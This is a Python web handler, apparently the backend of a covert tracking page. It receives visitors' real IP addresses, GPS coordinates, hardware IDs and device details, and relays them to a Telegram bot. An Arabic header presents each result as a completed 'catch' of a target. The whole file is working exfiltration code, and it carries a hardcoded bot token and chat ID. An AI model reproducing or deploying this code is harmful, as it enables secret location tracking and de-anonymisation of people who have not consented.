from http.server import BaseHTTPRequestHandler
import json
import requests

TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            device = data.get('device', {})
            gps = device.get('gps')
            
            maps_link = "غير متوفر"
            if isinstance(gps, dict):
                maps_link = f"https://www.google.com/maps?q={gps.get('lat')},{gps.get('lon')}"

            message = (
                "⚠️ **صيدة نجوسية مكتملة** ⚠️\n"
                "━━━━━━━━━━━━━━━\n"
                f"📝 **النشاط:** {data.get('action')}\n"
                f"🔥 **IP الحقيقي (النجوسية):** `{device.get('real_ip', 'N/A')}`\n"
                f"🌐 **IP المتصفح:** `{device.get('public_ip', 'N/A')}`\n"
                f"🔋 **البطارية:** {device.get('battery')}\n"
                f"🆔 **HW-ID:** `{device.get('gpu_hwid')}`\n"
                f"📱 **الجهاز:** {device.get('platform')}\n"
                f"🖥 **الشاشة:** {device.get('screen')}\n"
                f"📶 **الشبكة:** {device.get('network')}\n\n"
                f"📍 **قوقل ماب:**\n{maps_link}\n"
                "━━━━━━━━━━━━━━━"
            )

            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
            self.send_response(200)
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
